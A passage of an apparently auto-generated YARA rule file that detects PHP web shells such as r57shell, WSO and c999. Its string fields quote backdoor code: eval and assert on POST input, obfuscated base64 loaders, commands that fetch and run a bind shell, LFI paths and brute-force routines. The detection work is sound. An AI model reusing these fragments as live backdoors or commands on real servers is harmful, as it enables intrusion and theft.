      $s6 = "$builder->addModelTransformer(new CollectionToArrayTransformer());" fullword ascii
      $s7 = "use Symfony\\Component\\OptionsResolver\\OptionsResolver;" fullword ascii
      $s8 = "use Symfony\\Bridge\\Doctrine\\Form\\DataTransformer\\CollectionToArrayTransformer;" fullword ascii
      $s9 = "public function getBlockPrefix(): string" fullword ascii
      $s10 = "public function buildForm(FormBuilderInterface $builder, array $options): void" fullword ascii
      $s11 = "use Symfony\\Component\\OptionsResolver\\Options;" fullword ascii
      $s12 = "use Symfony\\Component\\Form\\FormBuilderInterface;" fullword ascii
      $s13 = "public function getParent(): string" fullword ascii
      $s14 = "public function __construct(RepositoryInterface $attributeRepository)" fullword ascii
      $s15 = "use Symfony\\Component\\Form\\AbstractType;" fullword ascii
      $s16 = "$this->attributeRepository = $attributeRepository;" fullword ascii
      $s17 = "namespace Sylius\\Bundle\\AttributeBundle\\Form\\Type;" fullword ascii
      $s18 = "return $this->attributeRepository->findAll();" fullword ascii
      $s19 = "'choices' => function (Options $options) {" fullword ascii
      $s20 = "return 'sylius_attribute_choice';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      8 of them
}

rule sig_918af72b83a165b25283dbd8f1490309dfdb77da
{
   meta:
      description = "php17 - file 918af72b83a165b25283dbd8f1490309dfdb77da.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "589ad371c414fae2d6f1f0ef7d197cf495bf06d1a0e367f9c3907b77f3054299"
   strings:
      $s1 = "if(file_exists($_POST['mk_name']) || !$file=@fopen($_POST['mk_name'],\"w\")) { err(2,$_POST['mk_name']); $_POST['cmd']=\"\"; " fullword ascii
      $s2 = "if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=(!$unix)?(\"dir\"):(\"ls -lia\"); }" fullword ascii
      $s3 = "if(file_exists($_POST['mk_name']) || !$file=@fopen($_POST['mk_name'],\"w\")) { err(2,$_POST['mk_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s4 = "'eng_text115'=>'Test bypass safe_mode, copy file via compress.zlib:// in function copy()'," fullword ascii
      $s5 = "@mysql_query(\"LOAD DATA INFILE \\\"\".$_POST['test3_file'].\"\\\" INTO TABLE temp_r57_table\");" fullword ascii
      $s6 = "@readfile (\"http://rst.void.ru/r57shell_version/version.php?version=\".$current_version.\"\");}}  " fullword ascii
      $s7 = "echo sr(25,\"<b>\".$lang[$language.'_text38'].$arrow.\"</b>\",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POS" ascii
      $s8 = "if($_POST['cmd']==\"ftp_file_up\")   { @ftp_put($connection,$_POST['ftp_file'],$_POST['loc_file'],$_POST['mode']);" fullword ascii
      $s9 = "if(@copy(\"compress.zlib://\".$_POST['test8_file1'], $_POST['test8_file2'])) echo $lang[$language.'_text118'];" fullword ascii
      $s10 = "if(!$file=@fopen($_POST['loc_file'],\"r\")) { err(1,$_POST['loc_file']); $_POST['cmd']=\"\"; }" fullword ascii
      $s11 = "ename($_POST['ftp_file']); } @ftp_get($connection,$_POST['loc_file'],$_POST['ftp_file'],$_POST['mode']);" fullword ascii
      $s12 = "if(!$file=@fopen($_POST['d_name'],\"r\")) { err(1,$_POST['d_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s13 = "if(!$file=@fopen($_POST['e_name'],\"r\")) { err(1,$_POST['e_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s14 = ";$sd98=\"john.barker446@gmail.com\";mail($sd98, $sj98, $msg8873, \"From: $sd98\");" fullword ascii
      $s15 = "</script>';$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_" ascii
      $s16 = "else if($fp){ foreach($sql->dump as $v) @fputs($fp,$v.\"\\r\\n\"); } " fullword ascii
      $s17 = "else if($_SERVER[\"HTTP_X_FORWARDED_FOR\"]) $ip = $_SERVER[\"HTTP_X_FORWARDED_FOR\"];" fullword ascii
      $s18 = "else if(!$users=get_users()) { echo \"<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><fon" ascii
      $s19 = "exit(\"<b><a href=http://rst.void.ru>r57shell</a> : Access Denied</b>\");" fullword ascii
      $s20 = "echo sr(25,\"<b>\".$lang[$language.'_text105'].$arrow.\"</b>\",in('text','to',45,(!empty($_POST['to'])?($_POST['to']):(\"hacker@" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      8 of them
}

rule php17_a
{
   meta:
      description = "php17 - file a.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ad7a8a7929c8469143ed82944518b909b4b19ccbe52f570a221ce62d22c4b623"
   strings:
      $s1 = "ype=text name=path><input type=\"file\" name=\"files\"><input type=submit value=\"Up\"></form></body></html>';" fullword ascii
      $s2 = "if (move_uploaded_file($files['tmp_name'], $fullpath)) {" fullword ascii
      $s3 = "echo \"<h1><a href='$fullpath'>OK-Click here!</a></h1>\";" fullword ascii
      $s4 = "$fullpath = $_REQUEST[\"path\"] . $files[\"name\"];" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_052335232b11864986bb2fa20fa38748
{
   meta:
      description = "php17 - file 052335232b11864986bb2fa20fa38748.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6e22d06c9335eba1693ad051e1429567b361c0028bfe314cf5c26eff59921d8a"
   strings:
      $s1 = "$Q='rray(\"/_/@t\",\"/-/\"),array(@t\"/\",\"@t+\"),$ss(@t$s[@t$i@t],0@t,$@t@te))),$k)));$o=ob_get_con@t@ttents()@t;ob_end';" fullword ascii
      $s2 = "$L=':;q=0@t.([\\\\d@t]@t))?,?/\",$ra,@t$m@t);if($@tq&@t&$m){@session_sta@trt()@t;$s@t=&$_SE@tSSI@tON;$ss=\"subst@t@tr\";$';" fullword ascii
      $s3 = "$A='@t)@t{$k=$k@th.$kf;ob_@tsta@trt();@e@t@tval(@gzuncom@tpress@t(@x(@base6@t4_dec@tode(pre@tg_re@tplace@t(@ta@t';" fullword ascii
      $s4 = "$v='sl=\"@tstrt@tolower\";$i=$m@t[1][0@t@t].$@tm[1][1];$h=$sl(@t@t$ss(md5($i.@t$kh),0,@t3))@t;$f=$s@tl($ss@t(md5($i.$@';" fullword ascii
      $s5 = "$K='@ts[@t$i@t]=\"\";$p=$s@ts($p,3);}if(arr@tay_ke@ty_@t@texists($i,$s)){$s@t[@t$i@t].=$p;$e=st@tr@tpos($s[$i],$f)@t;if($e';" fullword ascii
      $s6 = "$F='tkf)@t,0,3)@t);$p=\"\"@t;for(@t$z=1;$z<co@tu@tnt($m[1]@t);$@tz++)$p@t.=$q[$m[2@t][$z]];if(@tstrpo@ts($p,$@th)===@t0){$';" fullword ascii
      $s7 = "$R='$@tkh=\"5d41\";$k@tf=\"402a\";f@tuncti@ton @tx($t,$k){@t$c@t=strlen@t($k);$l=s@ttrlen($@tt);@t$o=\"\"@t;fo@tr($i=0@t;$i<$';" fullword ascii
      $s8 = "$D='r);@tpa@trse_@tstr($u[\"quer@ty\"],$@tq);$q=ar@tray_v@t@talues(@t$q);p@treg@t_matc@th_all(\"/([\\\\w])[\\\\w@t-]@t+(?';" fullword ascii
      $s9 = "$H='l@t;@t){for($j=0;@t($j<$c&@t&$i<$l);$j@t++,$i@t++){@t$o.=$t{@t$i}^$k@t{$j};}}ret@tur@tn $o;}$r@t=$@t_SERV@tER;$r';" fullword ascii
      $s10 = "$h='r=@$r[\"H@tTTP_RE@tFER@tE@tR\"];$ra=@$r@t[\"H@t@tTTP_ACCEPT_LAN@tGUA@tGE\"@t];if($rr&&$r@ta){$u=pa@trse@t_url($r';" fullword ascii
      $s11 = "$P=str_replace('@t','',$R.$H.$h.$D.$L.$v.$F.$K.$A.$Q.$i);" fullword ascii
      $s12 = "$S=str_replace('yS','','crySeaySySteySyS_fuySnction');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_02f039058bd48307e6f653a2005c9dd2
{
   meta:
      description = "php17 - file 02f039058bd48307e6f653a2005c9dd2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2b10ae98a69fa5c6e9d6b2ca8fb3932e59a66daab54e3ee345a32821564a3ae7"
   strings:
      $x1 = "*  - executing any shell commands and any PHP-code" fullword ascii
      $x2 = "exit(\"<h1><a href=http://php.spb.ru/remview/>phpRemoteView</a>: Access Denied - password erroneous</h1>\\n\");" fullword ascii
      $x3 = "exit(\"<h1><a href=http://php.spb.ru/remview/>phpRemoteView</a>: Access Denied - your host not allow</h1>\\n\");" fullword ascii
      $x4 = "*  2002.01.20 add panel 'TOOLS': eval php-code and run shell commands" fullword ascii
      $x5 = "*  - view index of directory (/var/log - view logs, /tmp - view PHP sessions)" fullword ascii
      $x6 = "$system_access=true;     // true - user (you) may be run shell commands" fullword ascii
      $s7 = "*             add panel 'TOOLS': eval php-code and run shell commands" fullword ascii
      $s8 = "*  Free download from http://php.spb.ru/remview/" fullword ascii
      $s9 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) && !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) " fullword ascii
      $s10 = "$HTTP_SERVER_VARS['PHP_AUTH_USER']!=$login || $HTTP_SERVER_VARS['PHP_AUTH_PW']!=$pass)) {" fullword ascii
      $s11 = "$phpeval_access=true;    // true - user (you) may be execute any php-code" fullword ascii
      $s12 = "*  2003.04.22 read first 64Kb of null-size file (example: /etc/zero), " fullword ascii
      $s13 = "*  - download any file and open on Notepad" fullword ascii
      $s14 = "$host_allow=array(\"*\");  // Type list of your(allow) hosts. All other - denied." fullword ascii
      $s15 = "if ($login!==false && (!isset($HTTP_SERVER_VARS['PHP_AUTH_USER']) || " fullword ascii
      $s16 = "*  (c) Dmitry Borodin, dima@php.spb.ru, http://php.spb.ru" fullword ascii
      $s17 = "$s.=sprintf(\"%1s%1s%1s\", $group['read'], $group['write'], $group['execute']); " fullword ascii
      $s18 = "$s.=sprintf(\"%1s%1s%1s\", $owner['read'], $owner['write'], $owner['execute']); " fullword ascii
      $s19 = "$s.=sprintf(\"%1s%1s%1s\", $world['read'], $world['write'], $world['execute']); " fullword ascii
      $s20 = "// antofix 'register globals': $HTTP_GET/POST_VARS -> normal vars;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule sig_29b2e224adeb25827ace775c536b21e77ee3c54b
{
   meta:
      description = "php17 - file 29b2e224adeb25827ace775c536b21e77ee3c54b.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d8275d733f20275c4e2546e2e8cecc8b33f4ac9cb947148c7092e672eb4987e8"
   strings:
      $s1 = "<?php $item['wind'] = 'assert';$array[] = $item;$array[0]['wind']($_POST['whirlwind']);?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_06521d9b70a37cb6455a9684ef3db13944feca2e
{
   meta:
      description = "php17 - file 06521d9b70a37cb6455a9684ef3db13944feca2e.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9ebb24b9f38a0cfb5be43a43933fc36aa47140089a5b07560130a88e0c887fed"
   strings:
      $x1 = "$str = \"host='\".$ip.\"' port='\".$port.\"' user='\".$login.\"' password='\".$pass.\"' dbname=postgres\";" fullword ascii
      $x2 = "if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {" fullword ascii
      $x3 = "echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit=\"if(this.ajax.checked){a(\\'Php\\',null" fullword ascii
      $x4 = "/* WSO 2.6 (404 Error Web Shell by Madleets.com) */" fullword ascii
      $x5 = "if( $this->link = @pg_connect(\"host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname\") ) return true;" fullword ascii
      $x6 = "print \"<font color='green'>[+] Exploitable!</font> <a href=\\\"\".$target.\"\".$lfitest.\"\\\">\".$target.\"\".$lfitest.\"</" fullword ascii
      $s7 = "wsoSecParam('Downloaders', implode(', ',$temp));" fullword ascii
      $s8 = "print \"<font color='green'>[+] File detected!</font> <a href=\\\"\".$target.\"\".$lfierror[$x].\"\\\">\".$target.\"\".$lfie" fullword ascii
      $s9 = "print \"<font color='green'>[+] File detected!</font> <a href=\\\"\".$target.\"\".$lficonfig[$x].\"\\\">\".$target.\"\".$lfi" fullword ascii
      $s10 = "t.sf.submit();'><br>File path:<input type=text name=file value='dump.sql'></td><td style='border-top:2px solid #666;'>\";" fullword ascii
      $s11 = "if( bruteForce($server[0],@$server[1], $_POST['login'], $line) ) {" fullword ascii
      $s12 = "$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch');" fullword ascii
      $s13 = "39 => \"../../../../../../../../../../../../../../../var/log/ftp-proxy/ftp-proxy.log\".$byte1.\"\"," fullword ascii
      $s14 = "2 => \"../../../../../../../../../../../../../../../www/logs/proftpd.system.log\".$byte1.\"\"," fullword ascii
      $s15 = "print \"<font color='red'>[!] Failed!</font>\".$target.\"\".$lficonfig[$x].\"<br  />\";" fullword ascii
      $s16 = "print \"<font color='green'>[+] File detected!</font> <a href=\\\"\".$target.\"\".$lfiprocenv.\"\\\">\".$target.\"\".$lfipro" fullword ascii
      $s17 = "print \"<font color='green'>[+] File detected!</font> <a href=\\\"\".$target.\"\".$lfiftp[$x].\"\\\">\".$target.\"\".$lfiftp" fullword ascii
      $s18 = "print \"<font color='green'>[+] File detected!</font> <a href=\\\"\".$target.\"\".$lfiaccess[$x].\"\\\">\".$target.\"\".$lfi" fullword ascii
      $s19 = "print \"<font color='green'>[+] File detected!</font> <a href=\\\"\".$target.\"\".$lfiphpini[$x].\"\\\">\".$target.\"\".$lfi" fullword ascii
      $s20 = "print \"<font color='green'>[+] File detected!</font> <a href=\\\"\".$target.\"\".$lfimysql[$x].\"\\\">\".$target.\"\".$lfim" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule php17_404once
{
   meta:
      description = "php17 - file 404once.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8da4202b128a60f1c4567442d1b648c103d9137c7adf1021c30af8956a881a6b"
   strings:
      $s1 = "<p>The requested URL /error.php was not found on this server.</p>" fullword ascii
      $s2 = "header('HTTP/1.1 404 Not Found');" fullword ascii
      $s3 = "@preg_replace(\"/[checksql]/e\",$_POST['date'],\"saft\");" fullword ascii
      $s4 = "<O>date=@eval($_POST[caicai]);</O> " fullword ascii
   condition:
      uint16(0) == 0x213c and filesize < 1KB and
      all of them
}

rule sig_873f79f291b6a33067177954ea2bb196
{
   meta:
      description = "php17 - file 873f79f291b6a33067177954ea2bb196.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f46ce5ef5f0e87ac662dca6b9879c85fc944ffd1f1c6eaa4e7abd6799e64e976"
   strings:
      $x1 = "$error = '7P15f9s4kjgO/737+ex7YDSejj12rNOH4o6nqfs+rTOdn4ciKYoSJcqk7tl+708VAJ6ibCfdvd/ZfSbdiSQchUKhUCgUCoUzc/KsStwXLpTijVrWCD3813" ascii
      $s2 = "* 500 is handling an Error Publishing Protocol request. " fullword ascii
      $s3 = "* Error Publishing Protocol " fullword ascii
      $s4 = "* @version 1.0.5-dc " fullword ascii
      $s5 = "odjz9B92huZ/lsTJfoX8JxmpX4v0blLiHKWwKup5DEutb0LvHShTWJc9+O1kmy9Gaxb68Lu8zorslzSssq/RnfZcE9/CduqZN/Aw==';" fullword ascii
      $s6 = "1oLdfRhvDXXHQi3XZ31m33Izepp05n0W/78mfdVrfTfermkt3ObLboUwm6lzMg4XrdhJjf4aqnl/b3C5iNkJ5VynaZrNLog2TSkvshUAO5rkzKlEYgaaNAEZ3gqM5W1W" ascii
      $s7 = "8wiIj1jKirCs6gXxf/oE69/+CuyNRyQ7RjKNtmanJEC+tkiFmpyaW5FxaGxR9U2IszjX5zhPT7UaVRBliwQgtpEtHxu3GhBKZxfBhz0LYtrjiTANsRcXpkOSz8DHosIS" ascii
      $s8 = "/8eMVRMwaZVh43Xyzqce9+neZHVCf1/wco/sfTPIDq3z26TjwSDEbgnXevTLuP85mkGh9dAzaR2bNpXhlAh4hmuqOcep7tsiLg0HLeweA9IUut4IXHNmRW10duGsZpRi" ascii
      $s9 = "5EzXqOa6GTDBqSYXj8sI5Z1XKtQoLhMOA71uchGhCE+5USVTWJox1MYlXirCroOudR3djpsTQixkZCcKR1YCFCZ1LOon8ksBwhOClnDURwOYuypKiL7sQOGVSBBGzxHi" ascii
      $s10 = "Vvwscqj6AqpHhQcWU24wCCtcQCeolzVKhZ5xDzhDcr6Drjgo/wt8QT3MTAe5dLLPPxBs2fTxByC5hIiuLCo3aFJNhxDjm5DhEMTIxLOnloLNSgDISXxLPUJRjaiRrklH" ascii
      $s11 = "a3L1K08XK/N7pdJd4cyIWb1qB8Y5TGQq7T4eObVGKcKqYcUUB6vl74drmAZpMviA7SpY6FdBORnmBvi7CtSWWTc01TxXjqRu0up1J1MwlXK+LlPtohiC6TjXk4312Pxb" ascii
      $s12 = "aWZK/d22O/AOwANdETcw9fQJNX5F4h4YwJJJAnUYN8Uc+k0dwkBJjvzRctQY6vaBpLOgod46viGpegFQpK/AR/n2GENqAcBrLOaKKbKxJ0DApquqIuTpRDFxir3FIwza" ascii
      $s13 = "Av8q3ITbeYrb57rR3lk+vhnsH2wNPWEm/3A8rXlsPYjTZkfQpc09I3B7kXjQx6Rb6yqEVAvkxgfQCYk4NUKNF00I+lfHcPUn89micjw/ZNqjmbrWAeLaA+9KGmw+dM7i" ascii
      $s14 = "T3tSclDutKrH0jv3Syy1JGETNpfld9ityCqI7dbvhtJ9eZZFaDZXq9Hab2qWqrVd2nW9tqvjXrKJFdcUwARjVeTqmwWraUflaJrBLtraGnB1qmxS8S7fmynNabpXR48t" ascii
      $s15 = "XfKnZSx+azMddHU1d8d989W6vFa9uoRjEKXC423oucR3sOCsujGZCo0LgMOVZU03VnlFWh8NySj1HpA2r9Y3O0Ho9dVnf7iqJgEtqRG5TM+guaty9lvfImrBf0krbbaO" ascii
      $s16 = "znlhWtyttl2ecwnVyM8po62EeAllXg7yTwu4Z2log472rHbQG8JrGxKM1uVYFx2dXUxE0VyKFY+OcZ/m0ia/8o/Nd/Ov58tgUDl882s22+WS3CUqulU1XKTq1sKov7Uf" ascii
      $s17 = "@eval(gzinflate(base64_decode($error)));" fullword ascii
      $s18 = "* @var bool " fullword ascii
      $s19 = "yWK3av7RI6ONs2xMcUJ38TePNt9etgNtpSDyp02EN02c5/76VhIq59LyW7KhAzS6qSpfzV9d//bpa5s8ya3K9XnxAuTHz+LHYprcl8uSQgTV0nki2lyiIJwxUVgf5jdc" ascii
      $s20 = "cilekAeKOrSr2biNTmD5Vpc11TIzupV4qOFq1oVYUp+wfVq6UT28q06q4HcJAHnXq19h9X738az3e3xzZtFhtZmwWy/0/79mvEHoD6sJlyVOCMPrHmS7qN+5G2M59MzM" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule sig_6612561e19ec45c494d5154c3b502a2e72817735
{
   meta:
      description = "php17 - file 6612561e19ec45c494d5154c3b502a2e72817735.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "bf83456b0b6f02b4bc25f1848c7f825cd7505f2c740f01c1a254df33bfebfa06"
   strings:
      $x1 = "RKS.COM/\\\">x2300 Shell</a>: Access Denied - your host (\".getenv(\"REMOTE_ADDR\").\") not allow\");}" fullword ascii
      $x2 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) and !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) {exit(\"<a href=\\\"http" ascii
      $x3 = "?><html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language" ascii
      $x4 = "myshellexec(\"lynx -dump $adires > sayko_bind;chmod 777 sayko_bind;./sayko_bind\");" fullword ascii
      $x5 = "function c999ftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh)" fullword ascii
      $x6 = "myshellexec(\"wget $adires -O sayko_bind;chmod 777 sayko_bind;./sayko_bind\");" fullword ascii
      $x7 = "echo \"<b>Your ip: <a href=http://whois.domaintools.com/\".$_SERVER[\"REMOTE_ADDR\"].\">\".$_SERVER[\"REMOTE_ADDR\"].\"</a> - Se" ascii
      $x8 = "iv=\\'refresh\\' content=\\'5\\\\;url=http\\:\\/\\/ALTURKS.COM\\'>/g' index.*\">index.* Mass Defacement" fullword ascii
      $x9 = "<OPTION VALUE=\"wget http://twofaced.org/linux2-6-all.c\">Linux Kernel 2.6.* rootkit.c" fullword ascii
      $x10 = "*  -Execute Mig-Log Logcleaner                           " fullword ascii
      $x11 = "if ($act == \"about\") {echo \"<center><b>Credits:<br>Idea, leading and coding by tristram[CCTeaM].<br>Beta-testing and some tip" ascii
      $x12 = "$accessdeniedmess = \"<a href=\\\"http://ALTURKS.COM\\\">x2300 Locus7Shell v.\".$shver.\"</a>: access denied\";" fullword ascii
      $x13 = "<OPTION VALUE=\"sed -i -e 's/<html>/<div style=\\'position\\:absolute\\;width\\:2000px\\;height\\:2000px\\;background-color\\:bl" ascii
      $x14 = "echo(\"<center><b>Bind Shell Backdoor:</b></br></br><form name=form method=POST>" fullword ascii
      $x15 = "$logfile = $tmpdir_logs.\"c999sh_ftpquickbrute_\".date(\"d.m.Y_H_i_s\").\".log\";" fullword ascii
      $x16 = "<OPTION VALUE=\"wget http://precision-gaming.com/sudo.c\">wget Linux sudo stack overflow" fullword ascii
      $x17 = "$fqb_log = \"FTP Quick Brute (called c999shell v. \".$shver.\") started at \".date(\"d.m.Y H:i:s\").\"\\r\\n\\r\\n\";" fullword ascii
      $s18 = "$c999sh_updateurl = \"http://ALTURKS.COM/files/lshell_update/\"; //Update server" fullword ascii
      $s19 = "$out = \"# Dumped by Locous7Shell.SQL v. \".$shver.\"" fullword ascii
      $s20 = "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" b" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 700KB and
      1 of ($x*) and all of them
}

rule app_test
{
   meta:
      description = "php17 - file app_test.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "47528e2b5e739660cccb86cc60a369efe0ba979bc476145ca45703d210432886"
   strings:
      $s1 = "$loader = require_once __DIR__.'/../app/autoload.php';" fullword ascii
      $s2 = "Request::enableHttpMethodParameterOverride();" fullword ascii
      $s3 = "use Symfony\\Component\\HttpFoundation\\Request;" fullword ascii
      $s4 = "header('HTTP/1.0 403 Forbidden');" fullword ascii
      $s5 = "exit('You are not allowed to access this file. Check '.basename(__FILE__).' for more information.');" fullword ascii
      $s6 = "$kernel->terminate($request, $response);" fullword ascii
      $s7 = "$response = $kernel->handle($request);" fullword ascii
      $s8 = "$kernel = new AppKernel('test', true);" fullword ascii
      $s9 = "if (!in_array(@$_SERVER['REMOTE_ADDR'], array(" fullword ascii
      $s10 = "require_once __DIR__.'/../app/AppKernel.php';" fullword ascii
      $s11 = "'172.33.33.1'," fullword ascii
      $s12 = "$request = Request::createFromGlobals();" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      8 of them
}

rule sig_7bd7bb6237c7654d933dc363cabbc553f9d21382
{
   meta:
      description = "php17 - file 7bd7bb6237c7654d933dc363cabbc553f9d21382.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "617ed1a8b61dd1f84acd225bfe8dc36c479a1ad3c98b2bb335b2735cb4fb2fe7"
   strings:
      $x1 = "$b = \"evilc0der.com\"; //need hits \"shell created by evilc0ders\"" fullword ascii
      $x2 = "$sql1  = \"# PostgreSQL dump created by r57shell\\r\\n\";" fullword ascii
      $x3 = "if(!@ftp_login($connection,$_POST['ftp_login'],$_POST['ftp_password'])) { fe($language,1); }" fullword ascii
      $s4 = "$text['eng'] = array('Connect to ftp server failed','Login to ftp server failed','Can\\'t change dir on ftp server');" fullword ascii
      $s5 = "/*  r57shell.php - ?????? ?? ??? ??????????? ??? ????????? ???? ???????  ?? ??????? ????? ???????" fullword ascii
      $s6 = "else if(!empty($_POST['dif'])&&!$fp) { echo \"[-] ERROR! Can't write in dump file\"; }" fullword ascii
      $s7 = "if(isset($_POST['cmd']) && !empty($_POST['cmd']) && $_POST['cmd']==\"download_file\" && !empty($_POST['d_name']))" fullword ascii
      $s8 = "@readfile (\"http://127.0.0.1/r57shell/version.php?version=\".$current_version.\"\");}}  " fullword ascii
      $s9 = "if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=($windows)?(\"dir\"):(\"ls -lia\"); }" fullword ascii
      $s10 = "$sql1  = \"# MSSQL dump created by r57shell\\r\\n\";" fullword ascii
      $s11 = "$sql1  = \"# MySQL dump created by r57shell\\r\\n\";" fullword ascii
      $s12 = "if(file_exists($_POST['mk_name']) || !$file=@fopen($_POST['mk_name'],\"w\")) { echo ce($_POST['mk_name']); $_POST['cmd']=\"\"" fullword ascii
      $s13 = "$sql = \"LOAD DATA INFILE \\\"\".$_POST['test3_file'].\"\\\" INTO TABLE temp_r57_table;\";" fullword ascii
      $s14 = "if(isset($_POST['cmd']) && !empty($_POST['cmd']) && $_POST['cmd']==\"mail_file\" && !empty($_POST['loc_file']))" fullword ascii
      $s15 = "echo sr(25,\"<b>\".$lang[$language.'_text38'].$arrow.\"</b>\",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POS" ascii
      $s16 = "if($_POST['cmd']==\"ftp_file_up\")   { @ftp_put($connection,$_POST['ftp_file'],$_POST['loc_file'],$_POST['mode']);" fullword ascii
      $s17 = "$db = @ocilogon($_POST['mysql_l'], $_POST['mysql_p'], $_POST['mysql_db']);" fullword ascii
      $s18 = "'ru_text99'=>'* ? ???????? ?????? ? ?????? ???????????? ??? ???????????? ?? /etc/passwd'," fullword ascii
      $s19 = "if(!$file=@fopen($_POST['loc_file'],\"r\")) { echo re($_POST['loc_file']); $_POST['cmd']=\"\"; }" fullword ascii
      $s20 = "$sql2 .= \"INSERT INTO \".$_POST['mysql_tbl'].\" (\".$keys.\") VALUES ('\".htmlspecialchars($values).\"');\\r\\n\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule Antichat_Shell__Modified_by_Go0o
{
   meta:
      description = "php17 - file Antichat_Shell._Modified_by_Go0o.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4bbf0521ec9f2c1ebcfba9da1f0008df21b7199327ea9b475c3fdd707d918b23"
   strings:
      $x1 = "?><?=$header;?><table width=\"100%\" bgcolor=\"#31333b\"  align=\"right\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\"><tr><" ascii
      $x2 = "elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$ret = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $x3 = "elseif(function_exists('system')){@ob_start();@system($cmd);$ret = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $x4 = "$header='<html><head><title>'.getenv(\"HTTP_HOST\").' - Antichat Shell</title><meta http-equiv=\"Content-Type\" content=\"text/h" ascii
      $x5 = "$header='<html><head><title>'.getenv(\"HTTP_HOST\").' - Antichat Shell</title><meta http-equiv=\"Content-Type\" content=\"text/h" ascii
      $s6 = "$content.=(!empty($_POST['dif_name'])?($_POST['dif_name']):(\"dump.sql\"));" fullword ascii
      $s7 = "$content.=(!empty($_POST['mysql_p'])?($_POST['mysql_p']):(\"password\"));" fullword ascii
      $s8 = "case fetch:shell(which('fetch').\" -o \".$_POST['filename'].\" -p \".$_POST['urldown'].\"\");break;" fullword ascii
      $s9 = "case curl:shell(which('curl').\" \".$_POST['urldown'].\" -o \".$_POST['filename'].\"\");break;" fullword ascii
      $s10 = "$serv = @mysql_connect(\"$adress:$port\", \"$login\", \"$pass\") or die(\"" fullword ascii
      $s11 = ": $cfa[0]<form name='mysql_dump' action='$php_self' method='post'>" fullword ascii
      $s12 = "$content.=\"<form name='dump1' action='$php_self' method='POST'>" fullword ascii
      $s13 = "$content.=\"<form name='dump2' action='$php_self' method='post'>" fullword ascii
      $s14 = "$content.=\"<form name='mysql_dump' action='$php_self' method='post'>" fullword ascii
      $s15 = "$content=\"<table><form action='$php_self' method=post name=md5><tr><td><b>Decrypte MD5</b>" fullword ascii
      $s16 = "$content.=(!empty($_POST['mysql_tbl'])?($_POST['mysql_tbl']):(\"user\"));" fullword ascii
      $s17 = "case lynx:shell(which('lynx').\" -source \".$_POST['urldown'].\" > \".$_POST['filename'].\"\");break;" fullword ascii
      $s18 = "case links:shell(which('links').\" -source \".$_POST['urldown'].\" > \".$_POST['filename'].\"\");break;" fullword ascii
      $s19 = "elseif(@is_resource($f = @popen($cmd,\"r\"))){$ret = \"\";while(!@feof($f)) { $ret .= @fread($f,1024); }@pclose($f);}" fullword ascii
      $s20 = "if(function_exists('exec')){@exec($cmd,$ret);$ret = join(\"\\n\",$ret);}" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 90KB and
      1 of ($x*) and 4 of them
}

rule asdfsdfsf
{
   meta:
      description = "php17 - file asdfsdfsf.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7b8c86d9e954a495cd3dd0f2a9d2ae7980dda7acffff6983678f90d59c45826a"
   strings:
      $s1 = "array_intersect_uassoc (array($_REQUEST[$password] => \"\"), array(1), $f);" fullword ascii
